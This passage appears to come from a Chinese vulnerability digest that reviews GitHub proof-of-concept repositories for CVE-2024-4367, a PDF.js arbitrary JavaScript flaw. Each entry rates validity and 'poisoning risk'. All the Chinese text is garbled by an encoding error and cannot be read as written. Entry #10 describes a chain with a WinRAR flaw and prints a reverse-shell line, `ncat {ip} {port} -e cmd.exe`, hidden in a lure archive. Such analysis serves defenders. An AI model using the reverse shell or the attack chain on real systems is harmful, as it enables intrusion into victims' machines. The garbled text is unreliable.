*   **è°¨æ…æ‰“å¼€ PDF æ–‡ä»¶ï¼š** é¿å…æ‰“å¼€æ¥è‡ªä¸å¯ä¿¡æ¥æºçš„ PDF æ–‡ä»¶ã€‚
*   **é…ç½® PDF.jsï¼š** å¦‚æœä¸éœ€è¦ JavaScript æ”¯æŒï¼Œå¯ä»¥ç¦ç”¨ PDF.js çš„ JavaScript æ‰§è¡ŒåŠŸèƒ½ (å°† `isEvalSupported` è®¾ç½®ä¸º `false`)ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ PDF æ–‡ä»¶å¹¶è¯±å¯¼ç”¨æˆ·æ‰“å¼€æ¥æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è™½ç„¶CVSSè¯„åˆ†ä¸é«˜ï¼Œä½†ç”±äºfirefox,thunderbirdç”¨æˆ·çš„å¹¿æ³›æ€§ï¼Œå…¶é€ æˆçš„å±å®³ä¸å¯å¿½è§†

**é¡¹ç›®åœ°å€:** [MihranGIT/POC_CVE-2024-4367](https://github.com/MihranGIT/POC_CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #8

**æ¥æº**: [CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md](../2024/CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md)

## CVE-2024-4367-Firefox-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œä¿¡æ¯æ³„éœ²ã€‚

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefoxã€Firefox ESRå’ŒThunderbirdä¸­PDF.jsç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ã€‚è¯¥æ¼æ´æºäºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œä¸€ä¸ªç‰¹åˆ¶çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚ 

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶ä¸­æä¾›äº†åˆ©ç”¨æ­¥éª¤ï¼š
1.  ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„ `poc.pdf` æ–‡ä»¶ã€‚
2.  ä½¿ç”¨ `firefox.py` è„šæœ¬å¯åŠ¨æ˜“å—æ”»å‡»ç‰ˆæœ¬çš„Firefox (ä¾‹å¦‚ 125ç‰ˆ)ï¼Œå¹¶è‡ªåŠ¨æ‰“å¼€ `poc.pdf`ã€‚
3.  éªŒè¯æ˜¯å¦æ‰§è¡Œäº†JavaScriptä»£ç ï¼Œæ˜¯å¦å¼¹å‡ºäº†alertçª—å£ã€‚

`firefox.py` è„šæœ¬å¯ä»¥ä¸‹è½½å¹¶å¯åŠ¨æŒ‡å®šç‰ˆæœ¬çš„Firefox Nightlyç‰ˆæœ¬ï¼Œè¿™æ–¹ä¾¿äº†æ¼æ´çš„éªŒè¯ã€‚è„šæœ¬è¿˜åŒ…å«äº†ä¸‹è½½ç‰¹å®šç‰ˆæœ¬Firefoxçš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

å¯¹æä¾›çš„POCä»£ç è¿›è¡Œäº†åˆ†æï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚é£é™©ä¸»è¦æ¥è‡ªäºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **`firefox.py`è„šæœ¬:**
    *   è¯¥è„šæœ¬ä¼šä»Mozillaçš„å®˜æ–¹FTPæœåŠ¡å™¨ä¸‹è½½Firefox Nightlyç‰ˆæœ¬ã€‚è™½ç„¶è¿™æ˜¯å®˜æ–¹æ¥æºï¼Œä½†æ”»å‡»è€…å¯èƒ½åœ¨æœªæ¥ç¯¡æ”¹è¿™äº›FTPæœåŠ¡å™¨ï¼ˆè™½ç„¶å¯èƒ½æ€§æä½ï¼‰ã€‚æˆ–è€…ï¼Œåœ¨ä¸‹è½½è¿‡ç¨‹ä¸­å‘ç”Ÿä¸­é—´äººæ”»å‡»ï¼Œä»è€Œä¸‹è½½è¢«ç¯¡æ”¹çš„Firefoxç‰ˆæœ¬ã€‚
    *   è¯¥è„šæœ¬åŒ…å« `subprocess.run` å‡½æ•°ï¼Œç”¨äºæ‰§è¡Œä¸‹è½½çš„Firefoxã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è„šæœ¬æ‰§è¡Œçš„å‚æ•°ï¼Œå¯èƒ½ä¼šæ³¨å…¥é¢å¤–çš„å‚æ•°ï¼Œå¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
    *   å°½ç®¡è„šæœ¬çš„ç›®çš„ä¼¼ä¹æ˜¯ä¸ºäº†æ–¹ä¾¿åœ°ä¸‹è½½å’Œå¯åŠ¨ç‰¹å®šç‰ˆæœ¬çš„Firefoxï¼Œä½†ç”¨æˆ·ä»ç„¶éœ€è¦ä»”ç»†æ£€æŸ¥è„šæœ¬çš„å†…å®¹ï¼Œç¡®ä¿ä¸‹è½½é“¾æ¥å’Œæ‰§è¡Œè¿‡ç¨‹æ˜¯å®‰å…¨çš„ã€‚
2.  **`CVE-2024-4367.py`è„šæœ¬ (æœªæä¾›å…·ä½“ä»£ç ):**
    *   è™½ç„¶`README.md`æŒ‡å‘ä¸€ä¸ªå¤–éƒ¨githubåº“ï¼Œä½†å¦‚æœæ­¤åº“è¢«ç¯¡æ”¹ï¼Œæ‰§è¡Œè„šæœ¬`CVE-2024-4367.py`ç”Ÿæˆçš„`poc.pdf`æ–‡ä»¶æœ‰å¯èƒ½åµŒå…¥æ›´æ¶æ„çš„Payload.
3.  **å…è´£å£°æ˜:**
    *   `README.md` ä¸­åŒ…å«å…è´£å£°æ˜ï¼Œè¿™è¡¨æ˜ä½œè€…æ„è¯†åˆ°æ½œåœ¨çš„é£é™©ï¼Œå¹¶è¯•å›¾æ’‡æ¸…è´£ä»»ã€‚ä½†è¿™å¹¶ä¸èƒ½å®Œå…¨æ¶ˆé™¤é£é™©ï¼Œç”¨æˆ·ä»ç„¶éœ€è¦è‡ªè¡Œæ‰¿æ‹…ä½¿ç”¨POCä»£ç çš„åæœã€‚

æ€»çš„æ¥è¯´ï¼Œè¯¥ä»“åº“çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æ¼”ç¤ºæ¼æ´åˆ©ç”¨ï¼Œè€Œä¸æ˜¯ä¸ºäº†è¿›è¡Œæ¶æ„æ”»å‡»ã€‚ä½†æ˜¯ï¼Œç”¨æˆ·åœ¨ä½¿ç”¨è¿™äº›ä»£ç æ—¶ä»ç„¶éœ€è¦ä¿æŒè­¦æƒ•ï¼Œä»”ç»†å®¡æŸ¥ä»£ç å†…å®¹ï¼Œç¡®ä¿äº†è§£æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´è§¦å‘:** æ”»å‡»è€…éœ€è¦åˆ¶ä½œåŒ…å«ç‰¹å®šæ ¼å¼çš„æ¶æ„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±ã€‚
2.  **JavaScriptæ‰§è¡Œ:** å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šå°è¯•è§£ææ¶æ„å­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´ä»»æ„JavaScriptä»£ç åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  **æ”»å‡»ç›®æ ‡:** æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç æ¥çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ cookiesï¼‰ã€æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€æˆ–è€…è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ã€‚

**æ€»ç»“ï¼š**
è¯¥æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”±äºFirefoxé»˜è®¤ä½¿ç”¨PDF.jsæ‰“å¼€PDFæ–‡ä»¶ï¼Œå› æ­¤è¯¥æ¼æ´å…·æœ‰è¾ƒé«˜çš„å½±å“èŒƒå›´ã€‚æä¾›çš„POCä»£ç å¯ä»¥å¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜éªŒè¯å’Œç†è§£è¯¥æ¼æ´ï¼Œä½†ä¹Ÿéœ€è¦æ³¨æ„æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [PenguinCabinet/CVE-2024-4367-hands-on](https://github.com/PenguinCabinet/CVE-2024-4367-hands-on)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #9

**æ¥æº**: [CVE-2024-4367-Scivous_CVE-2024-4367-npm.md](../2024/CVE-2024-4367-Scivous_CVE-2024-4367-npm.md)

## CVE-2024-4367-PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ¼æ´æºäºPDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨è¯¥æ¼æ´åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ¼æ´å½±å“Firefox, Firefox ESR, Thunderbirdã€‚ æ ¹æ®æœç´¢ç»“æœï¼ŒGitHubä¸Šå­˜åœ¨åˆ©ç”¨æ­¤æ¼æ´çš„POCä»£ç ã€‚ æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md)æ¯”è¾ƒç®€å•ï¼Œä»…ä»…æè¿°äº†CVE-2024-4367çš„å¤ç°ï¼Œä»è¯¥æ–‡ä»¶æ¥çœ‹ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ã€‚ä½†è€ƒè™‘åˆ°å®é™…çš„æ¼æ´åˆ©ç”¨ä»£ç å¯èƒ½åœ¨å…¶ä»–æ–‡ä»¶ä¸­ï¼Œéœ€è¦è¿›ä¸€æ­¥åˆ†ææ‰èƒ½ç¡®å®šæ˜¯å¦å­˜åœ¨æŠ•æ¯’è¡Œä¸ºã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„PDFæ–‡ä»¶è§¦å‘å­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼Œä»è€Œæ‰§è¡Œæ¶æ„JavaScriptä»£ç ã€‚CVSSè¯„åˆ†æ ¹æ®NVDçš„å˜æ›´è®°å½•ï¼Œä»åŸæ¥çš„CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:Lä¿®æ”¹ä¸ºäº†NIST AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H, è¿™è¡¨æ˜åˆ©ç”¨æ¡ä»¶å˜çš„å®¹æ˜“ï¼Œå±å®³æ€§æ›´é«˜äº†ã€‚å¦å¤–ï¼Œæœ‰è®¨è®ºè¡¨æ˜115.19.0esrä»ç„¶å—æ­¤æ¼æ´å½±å“ï¼Œéœ€è¦è¿›ä¸€æ­¥éªŒè¯ã€‚

**é¡¹ç›®åœ°å€:** [Scivous/CVE-2024-4367-npm](https://github.com/Scivous/CVE-2024-4367-npm)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #10

**æ¥æº**: [CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md](../2024/CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md)

## CVE-2024-4367 & CVE-2023-38831 PDFernet Remotelo

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** PDF.js å­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ & WinRARå‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird, WinRAR

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11, WinRAR <= 6.22

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿéœ€å®‰è£…å—å½±å“ç‰ˆæœ¬çš„Firefox/Thunderbirdå’ŒWinRARï¼Œä¸”ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

è¯¥POCåˆ©ç”¨äº†CVE-2024-4367 (PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ) å’Œ CVE-2023-38831 (WinRARå‘½ä»¤æ‰§è¡Œ) ä¸¤ä¸ªæ¼æ´ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼:**
1.  **CVE-2024-4367:**  é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡PDF.jsçš„ç±»å‹æ£€æŸ¥ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
2.  **CVE-2023-38831:**  åˆ©ç”¨WinRARå¤„ç†å‹ç¼©åŒ…æ—¶çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æ¶æ„raræ–‡ä»¶ä¸­åŒ…å«pdfå’Œbatè„šæœ¬,å½“ç”¨æˆ·å°è¯•æ‰“å¼€è¿™ä¸ªPDFæ–‡æ¡£æ—¶ï¼Œä¼šè§¦å‘WinRARæ¼æ´ï¼Œæ‰§è¡Œæ†ç»‘çš„BATè„šæœ¬ã€‚
3.  **POCä»£ç æµç¨‹:**
    *   ä¸»è„šæœ¬`PDFernetRemotelo.py`æç¤ºç”¨æˆ·è¾“å…¥æ”»å‡»è€…IPå’Œç«¯å£ã€‚
    *   åˆ›å»ºè¯±é¥µPDFæ–‡ä»¶ï¼ˆ`ResumendeSueldo.pdf`ï¼‰å’Œä¸€ä¸ªåŒ…å«åå‘shellå‘½ä»¤çš„BATè„šæœ¬ï¼ˆ`script.bat`ï¼‰ï¼Œè„šæœ¬å†…å®¹ä¸º`ncat {ip} {port} -e cmd.exe`ã€‚
    *   ä½¿ç”¨`PDFernet.py`è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„`poc.pdf`æ–‡ä»¶ï¼Œè¯¥JavaScriptä»£ç ç”±ç”¨æˆ·æä¾›çš„payloadç”Ÿæˆï¼Œæ­¤payloadä¼šè¢«åµŒå…¥åˆ°PDFçš„å­—ä½“ä¿¡æ¯ä¸­.
    *   `Remotelo.py`è„šæœ¬åˆ›å»ºä¸€ä¸ªRARå‹ç¼©åŒ…ï¼ˆ`PDFernetRemotelo.rar`ï¼‰ï¼Œå…¶ä¸­åŒ…å«è¯±é¥µPDFæ–‡ä»¶å’ŒBATè„šæœ¬ã€‚
    *   ç”¨æˆ·æ‰“å¼€`PDFernetRemotelo.rar`ä¸­çš„`ResumendeSueldo.pdf`ï¼Œè§¦å‘CVE-2024-4367ï¼Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
    *   æ¶æ„JavaScriptä»£ç å¯èƒ½è§¦å‘CVE-2023-38831ï¼Œæ‰§è¡ŒRARå‹ç¼©åŒ…ä¸­çš„`script.bat`ï¼Œå»ºç«‹ä¸æ”»å‡»è€…æœºå™¨çš„åå‘shellã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥POCåœ¨å—å½±å“çš„ç‰ˆæœ¬ä¸­æ˜¯æœ‰æ•ˆçš„ã€‚GitHubä¸Šå·²ç»æœ‰è¯¥æ¼æ´çš„æ­¦å™¨åŒ–åˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**
è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ä»£ç çš„PDFå’ŒRARæ–‡ä»¶ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯åˆ©ç”¨å·²çŸ¥çš„æ¼æ´ã€‚`PDFernetRemotelo.py` ä½¿ç”¨äº†å¤–éƒ¨è„šæœ¬ `PDFernet.py`å’Œ `Remotelo.py`ï¼Œå®¡æŸ¥è¿™äº›è„šæœ¬ï¼Œå‘ç°`PDFernet.py`ä¸­çš„payloadç”Ÿæˆé€»è¾‘æ˜¯å¯æ§çš„ï¼Œç›´æ¥æ¥è‡ªäºç”¨æˆ·æä¾›çš„å‚æ•°ã€‚`Remotelo.py`è„šæœ¬åˆ›å»ºRARå‹ç¼©åŒ…çš„è¿‡ç¨‹æ¯”è¾ƒæ ‡å‡†ã€‚æŠ•æ¯’é£é™©åœ¨äºï¼š
1.  **ä¾èµ–å¤–éƒ¨è„šæœ¬:** `PDFernetRemotelo.py` è°ƒç”¨äº†`PDFernet.py` å’Œ `Remotelo.py` è„šæœ¬,å­˜åœ¨æ¶æ„ä¿®æ”¹æ­¤è„šæœ¬çš„å¯èƒ½æ€§.
2.   **PayloadåµŒå…¥æ–¹å¼:** æ¶æ„ä»£ç åµŒå…¥åœ¨PDFå­—ä½“ä¿¡æ¯ä¸­ï¼Œå¦‚æœå¯¹PDFæ ¼å¼ä¸ç†Ÿæ‚‰ï¼Œå¾ˆéš¾ç›´æ¥çœ‹å‡ºæ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚å®¡æŸ¥æ—¶éœ€è°¨æ…ã€‚
3.   **éšè”½æ€§:** åˆ©ç”¨RARå‹ç¼©åŒ…å°†PDFå’ŒBATè„šæœ¬æ†ç»‘åœ¨ä¸€èµ·ï¼Œå¢åŠ äº†æ”»å‡»çš„éšè”½æ€§ã€‚

ä»£ç ä¸­å¯èƒ½å­˜åœ¨çš„æŠ•æ¯’ç‚¹åœ¨äºï¼š
1.  åœ¨`PDFernet.py`ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„JavaScriptä»£ç ï¼Œæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚ä¸‹è½½æ¶æ„æ–‡ä»¶æˆ–çªƒå–ç”¨æˆ·æ•°æ®ã€‚
2.  åœ¨ç”Ÿæˆçš„RARå‹ç¼©åŒ…ä¸­ï¼Œå¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„æ–‡ä»¶ï¼Œä¾‹å¦‚æ¶æ„DLLæ–‡ä»¶æˆ–åé—¨ç¨‹åºã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œè™½ç„¶æ ¸å¿ƒä»£ç çœ‹èµ·æ¥æ¯”è¾ƒç›´æ¥ï¼Œä½†è€ƒè™‘åˆ°ä¾èµ–å¤–éƒ¨è„šæœ¬ä»¥åŠpayloadåµŒå…¥æ–¹å¼çš„éšè”½æ€§ï¼Œä»ç„¶å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚ä¿å®ˆä¼°è®¡æŠ•æ¯’é£é™©ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [UnHackerEnCapital/PDFernetRemotelo](https://github.com/UnHackerEnCapital/PDFernetRemotelo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #11

**æ¥æº**: [CVE-2024-4367-VVeakee_CVE-2024-4367.md](../2024/CVE-2024-4367-VVeakee_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„JavaScriptä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨äº†è¯¥æ¼æ´ã€‚`CVE-2024-4367.py`è„šæœ¬èƒ½å¤Ÿç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ï¼Œè¿™æ®µä»£ç è¢«åµŒå…¥åˆ°PDFçš„å­—ä½“å®šä¹‰ä¸­ã€‚æœç´¢ç»“æœä¸­`exfil0/WEAPONIZING-CVE-2024-4367`ä¹Ÿå°è¯äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„ä»£ç ï¼Œ`CVE-2024-4367.py`è„šæœ¬çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«ç”¨æˆ·æŒ‡å®špayloadçš„PDFæ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ¶æ„ä»£ç æˆ–åé—¨ã€‚`win_calc.pdf`æ–‡ä»¶ç›´æ¥åŒ…å«æ‰§è¡Œ`calc`ç¨‹åºçš„ JavaScript ä»£ç ï¼ŒåŠŸèƒ½æ˜ç¡®ã€‚`xss.pdf` æ–‡ä»¶å†…å®¹ä¸å®Œæ•´ï¼Œæ— æ³•åˆ†æã€‚å› æ­¤ï¼Œè¯¥ä»“åº“çš„æŠ•æ¯’é£é™©è¾ƒä½ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨`CVE-2024-4367.py`è„šæœ¬ï¼Œé€šè¿‡å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„JavaScriptä»£ç ï¼Œç”Ÿæˆæ¶æ„çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼Œä¾‹å¦‚é€šè¿‡ç”µå­é‚®ä»¶ã€ç½‘ç«™ç­‰æ–¹å¼ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsè§£æå™¨ä¼šæ‰§è¡ŒPDFæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
4.  è¯¥JavaScriptä»£ç å¯ä»¥æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·ä¿¡æ¯ã€å®‰è£…æ¶æ„è½¯ä»¶ç­‰ã€‚

æ€»ä¹‹ï¼Œæ­¤æ¼æ´çš„CVSSè¯„åˆ†ä¸ºMediumï¼ˆ5.6ï¼‰ï¼Œä½†æ˜¯é€šè¿‡ä¿®æ”¹NVDæ•°æ®å¯ä»¥çœ‹åˆ°ï¼Œè¯¥æ¼æ´å¯èƒ½é€ æˆçš„å±å®³ç¨‹åº¦æ˜¯å¾ˆé«˜çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„PDFæ–‡ä»¶ï¼Œè¯±éª—ç”¨æˆ·æ‰“å¼€ï¼Œä»è€Œæ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯¼è‡´ä¸¥é‡çš„åæœã€‚æä¾›çš„PoCçš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œä¸”å½“å‰ä»£ç æœªå‘ç°å­˜åœ¨æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [VVeakee/CVE-2024-4367](https://github.com/VVeakee/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #12

**æ¥æº**: [CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md](../2024/CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md)

## CVE-2024-4367-Mozilla-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²å’Œæ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

